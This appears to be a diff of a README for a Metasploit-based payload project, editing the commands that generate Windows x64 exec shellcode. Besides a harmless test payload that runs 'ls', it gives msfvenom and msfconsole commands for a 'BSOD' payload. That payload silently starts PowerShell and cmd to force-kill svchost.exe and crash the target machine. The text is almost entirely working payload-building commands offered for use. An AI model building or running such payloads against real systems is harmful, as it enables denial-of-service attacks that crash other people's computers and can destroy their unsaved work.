@@ -24,10 +24,10 @@ Install Metasploit Framework:
 sudo apt install metasploit-framework -y
 ```
 
-### Test shellcode (need PowerShell 7 on Windows)
+### Test shellcode
 
 ```bash
-msfconsole -x "use payload/windows/x64/exec; set CMD 'pwsh -CommandWithArgs \"ls\" && pause'; generate -f ps1"
+msfconsole -x "use payload/windows/x64/exec; set CMD 'powershell -c \"ls\" && pause'; generate -f ps1; exit"
 ```
 
 ### Generate BSOD (building an executable file)
@@ -42,4 +42,5 @@ msfvenom --platform windows --arch x64 -p windows/x64/exec CMD='cmd.exe /c start
 msfconsole
 > use payload/windows/x64/exec
 > set CMD cmd.exe /c start /min powershell -Command \"Start-Process cmd -ArgumentList \\\"/c taskkill /F /IM svchost.exe\\\" -WindowStyle Hidden\"
+> exit
 ```
